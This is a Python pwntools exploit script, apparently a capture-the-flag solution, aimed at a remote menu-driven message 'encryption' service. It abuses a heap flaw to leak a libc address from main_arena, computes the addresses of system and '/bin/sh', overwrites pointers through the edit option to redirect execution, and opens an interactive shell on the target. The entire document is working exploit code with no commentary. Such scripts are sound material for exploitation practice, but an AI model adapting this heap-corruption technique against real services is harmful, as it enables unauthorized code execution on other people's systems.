from pwn import *


def bxor(s, b):
    res = ''
    for x in s:
        res += chr(ord(x) ^ b)
    return res


def sxor(a, b):
    res = ''
    for x, y in zip(a, b):
        res += chr(ord(x) ^ ord(y))
    return res


def encrypt(pc, option, size, msg):
    pc.sendlineafter('>', '1')
    pc.sendlineafter('Choose an encryption option:', str(option))
    if option not in [1, 2]:
        return
    pc.sendlineafter('How long is your message?', str(size))
    if size == 0:
        return
    pc.sendlineafter('Please enter your message: ', msg)


def remove(pc, index):
    pc.sendlineafter('>', '2')
    pc.sendlineafter('Enter the index of the message that you want to remove: ', str(index))


def view(pc):
    pc.sendlineafter('>', '3')


def edit(pc, index, new_msg):
    pc.sendlineafter('>', '4')
    pc.sendlineafter('Enter the index of the message that you wish to edit', str(index))
    pc.sendlineafter('Enter the new message', new_msg)    


def main():
    libc = ELF('./libc-2.23.so')

    pc = remote('stack.overflow.fail', 9004)

    pc.sendlineafter('What is your user id?', str(0x70))

    encrypt(pc, 2, 0x100, 'AAAA')
    encrypt(pc, 2, 0x60, 'BBBB')

    remove(pc, 0)

    encrypt(pc, 2, 0, '')

    view(pc)
    for _ in range(11):
        pc.recvline()
    main_arena = u64(bxor(pc.recvline()[12:-1], 0x70).ljust(8, '\x00'))
    libc_base = main_arena - 0x3c4d00
    binsh = libc_base + next(libc.search('/bin/sh'))
    system = libc_base + libc.symbols['system']
    log.success('libc base @ ' + hex(libc_base))

    encrypt(pc, 2, 0x20, 'A' * 0x20)
    remove(pc, 2)
    
    encrypt(pc, 3, 0, '')
    encrypt(pc, 3, 0, '')
    encrypt(pc, 3, 0, '')

    edit(pc, 2, p64(binsh) + p64(0) + p64(system) + p64(0))
    edit(pc, 4, '')

    pc.interactive()


if __name__ == '__main__':
    main()